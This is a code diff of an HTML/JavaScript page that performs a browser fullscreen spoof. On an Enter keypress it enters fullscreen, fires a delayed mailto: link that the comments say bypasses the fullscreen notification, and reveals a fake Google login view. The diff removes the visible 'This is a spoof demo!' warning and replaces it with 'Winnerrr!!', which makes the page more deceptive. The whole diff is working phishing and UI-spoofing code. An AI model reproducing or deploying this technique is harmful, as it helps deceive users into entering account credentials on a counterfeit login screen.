@@ -70,7 +70,7 @@
         <button type="submit">Next</button>
       </form>
 
-      <div class="warning">This is a spoof demo!</div>
+      <div class="warning">Winnerrr!!</div>
     </div>
   </div>
 
@@ -78,16 +78,13 @@
     // Trigger saat tekan ENTER
     window.addEventListener("keydown", function(e) {
       if (e.key === "Enter" || e.keyCode === 13) {
-        e.preventDefault(); // cegah scroll atau form submit
+        e.preventDefault();
 
         const front = document.getElementById("front");
         const spoofed = document.getElementById("spoofed");
         const elem = document.documentElement;
 
-        // 1. TRIGGER MAILTO: (BYPASS FULLSCREEN NOTIFICATION)
-        location.href = "mailto:security@google.com?subject=Account%20Compromised&body=Dear%20Google%20Team,%0A%0AMy%20account%20has%20been%20compromised.%20Please%20help.";
-
-        // 2. REQUEST FULLSCREEN (trusted karena keypress)
+        // STEP 2: FULLSCREEN DULU (trusted karena keypress)
         if (elem.requestFullscreen) {
           elem.requestFullscreen();
         } else if (elem.webkitRequestFullscreen) {
@@ -96,7 +93,12 @@
           elem.msRequestFullscreen();
         }
 
-        // 3. GANTI TAMPILAN KE SPOOF GOOGLE LOGIN
+        // STEP 3: BARU TRIGGER MAILTO:
+        setTimeout(() => {
+          location.href = "mailto:security@not-google.com?subject=Account%20Compromised&body=Dear%20Google%20Team,%0A%0AMy%20account%20has%20been%20compromised.%20Please%20help.";
+        }, 300); // Delay kecil biar fullscreen settle dulu
+
+        // GANTI TAMPILAN KE SPOOF GOOGLE LOGIN
         front.style.display = "none";
         spoofed.style.display = "block";
 
